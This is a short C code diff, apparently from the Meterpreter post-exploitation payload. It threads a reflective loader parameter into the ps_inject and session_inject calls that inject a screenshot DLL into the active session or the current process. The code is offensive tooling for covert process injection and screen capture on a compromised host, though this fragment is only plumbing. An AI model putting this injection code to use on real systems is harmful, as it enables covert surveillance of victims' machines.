@@ -426,6 +426,8 @@ DWORD request_ui_desktop_screenshot(Remote * remote, Packet * request)
 			quality = 50;
 		}
 
+		LPCSTR reflectiveLoader = met_api->packet.get_tlv_value_reflective_loader(request);
+
 		// get the x86 and x64 screenshot dll's. we are not obliged to send both but we reduce the number of processes
 		// we can inject into (wow64 and x64) if we only send one type on an x64 system. If we are on an x86 system
 		// we dont need to send the x64 screenshot dll as there will be no x64 processes to inject it into.
@@ -471,7 +473,7 @@ DWORD request_ui_desktop_screenshot(Remote * remote, Packet * request)
 		if (dwCurrentSessionId != dwActiveSessionId)
 		{
 			dprintf("[UI] desktop_screenshot. Injecting into active session %d...\n", dwActiveSessionId);
-			if (session_inject(dwActiveSessionId, &dllBuffer, cCommandLine) != ERROR_SUCCESS)
+			if (session_inject(dwActiveSessionId, &dllBuffer, reflectiveLoader, cCommandLine) != ERROR_SUCCESS)
 			{
 				BREAK_WITH_ERROR("[UI] desktop_screenshot. session_inject failed", ERROR_ACCESS_DENIED);
 			}
@@ -479,7 +481,7 @@ DWORD request_ui_desktop_screenshot(Remote * remote, Packet * request)
 		else
 		{
 			dprintf("[UI] desktop_screenshot. Allready in the active session %d.\n", dwActiveSessionId);
-			if (ps_inject(GetCurrentProcessId(), &dllBuffer, cCommandLine) != ERROR_SUCCESS)
+			if (ps_inject(GetCurrentProcessId(), &dllBuffer, reflectiveLoader, cCommandLine) != ERROR_SUCCESS)
 			{
 				BREAK_WITH_ERROR("[UI] desktop_screenshot. ps_inject current process failed", ERROR_ACCESS_DENIED);
 			}
